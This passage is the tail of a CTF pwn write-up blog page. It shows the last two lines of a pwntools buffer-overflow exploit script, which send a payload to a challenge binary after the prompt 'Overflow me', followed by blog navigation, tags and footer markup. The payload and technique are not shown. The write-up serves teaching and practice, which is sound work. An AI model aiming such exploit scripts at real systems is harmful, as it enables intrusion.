<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Overflow me</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">clean</span><span class="p">())</span>
</pre></td></tr></tbody></table></code></div></div>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_16-01.png" alt="" /></p>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/blog/en/categories/pwn-journey/'>PWN Journey</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/blog/en/tags/reverse-engineer/"
          class="post-tag no-text-decoration" >reverse engineer</a>
      
      <a href="/blog/en/tags/pwn/"
          class="post-tag no-text-decoration" >pwn</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=PWN Journey: Part 1 - Another infosec blog&url=http://localhost:4000/blog/en/posts/pwns-1/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=PWN Journey: Part 1 - Another infosec blog&u=http://localhost:4000/blog/en/posts/pwns-1/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=PWN Journey: Part 1 - Another infosec blog&url=http://localhost:4000/blog/en/posts/pwns-1/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
    </div>
  </div> <!-- #core-wrapper -->

  <!-- pannel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

    <div class="access">
      















  <div id="access-lastmod" class="post">
    <div class="panel-heading">Recent Update</div>
    <ul class="post-content pl-0 pb-1 ml-1 mt-2">
      
        
        
        
      <li><a href="/blog/en/posts/pwns-2/">PWN Journey: Part 2</a></li>
      
        
        
        
      <li><a href="/blog/en/posts/ez-bof/">KCSC: A simple BOF</a></li>
      
        
        
        
      <li><a href="/blog/en/posts/HTB-Sharp/">HackTheBox: Sharp</a></li>
      
        
        
        
      <li><a href="/blog/en/posts/HTB-Armageddon/">HackTheBox: Armageddon</a></li>
      
        
        
        
      <li><a href="/blog/en/posts/HTB-TheNotebook/">HackTheBox: The Notebook</a></li>
      
    </ul>
  </div> <!-- #access-lastmod -->



      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/blog/en/tags/pwn/">pwn</a>
    
      
      <a class="post-tag" href="/blog/en/tags/hackthebox/">hackthebox</a>
    
      
      <a class="post-tag" href="/blog/en/tags/network/">network</a>
    
      
      <a class="post-tag" href="/blog/en/tags/reverse-engineer/">reverse engineer</a>
    
      
      <a class="post-tag" href="/blog/en/tags/kma/">kma</a>
    
      
      <a class="post-tag" href="/blog/en/tags/machine/">machine</a>
    
      
      <a class="post-tag" href="/blog/en/tags/miscs/">miscs</a>
    
      
      <a class="post-tag" href="/blog/en/tags/on-going/">On-going</a>
    
      
      <a class="post-tag" href="/blog/en/tags/thoughts/">thoughts</a>
    
      
      <a class="post-tag" href="/blog/en/tags/web-pentest/">web-pentest</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
      
        
        <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/blog/en/posts/ez-bof/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->





<em class="timeago small"
    date="2021-02-24 03:45:00 +0800"
    >Feb 24, 2021</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>KCSC: A simple BOF</h3>
            <div class="text-muted small">
              <p>
                





                Today we are going to test out Ghidra with one of my university pwnie challenge.


  
    
      Info
      Value
    
  
  
    
      Name
      pwn1
    
    
      SHA256
      d3e77076e7c9c113...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/blog/en/posts/pwns-2/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->





<em class="timeago small"
    date="2021-12-20 00:00:00 +0800"
    >Dec 20, 2021</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>PWN Journey: Part 2</h3>
            <div class="text-muted small">
              <p>
                





                In this post, we will solve two pwn challenges from WhiteHat Play!10 and a customized one. We will also delve into details about most frequently encountered protection bits as well as bypass method...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/blog/en/posts/HTB-Sharp/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->





<em class="timeago small"
    date="2021-05-16 03:45:00 +0800"
    >May 16, 2021</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox: Sharp</h3>
            <div class="text-muted small">
              <p>
                





                Hi, after a long time not posting anything on this blog because of my university workload. Let’s get back to our normal routine of pwning. Today, I will do a writeup of retired HackTheBox (HTB) mac...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


      
        
        <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/blog/en/posts/HTB-BountyHunter/" class="btn btn-outline-primary"
    prompt="Older">
    <p>HackTheBox: BountyHunter</p>
  </a>
  

  
  <a href="/blog/en/posts/pwns-2/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>PWN Journey: Part 2</p>
  </a>
  

</div>

      
        
        <!--
  The Disqus lazy loading.
-->



      
    </div>
  </div>
</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center text-muted">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/0x7c00">The Archivist</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Most rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        

        

        Powered by Github Pages and Jekyll.

      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/blog/en/tags/pwn/">pwn</a>
    
      
      <a class="post-tag" href="/blog/en/tags/hackthebox/">hackthebox</a>
    
      
      <a class="post-tag" href="/blog/en/tags/network/">network</a>
    
      
      <a class="post-tag" href="/blog/en/tags/reverse-engineer/">reverse engineer</a>
    
      
      <a class="post-tag" href="/blog/en/tags/kma/">kma</a>
    
      
      <a class="post-tag" href="/blog/en/tags/machine/">machine</a>
    
      
      <a class="post-tag" href="/blog/en/tags/miscs/">miscs</a>
    
      
      <a class="post-tag" href="/blog/en/tags/on-going/">On-going</a>
    
      
      <a class="post-tag" href="/blog/en/tags/thoughts/">thoughts</a>
    
      
      <a class="post-tag" href="/blog/en/tags/web-pentest/">web-pentest</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/blog/en/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup -->
  <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>





<script defer src="/blog/en/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>




  </body>

</html>

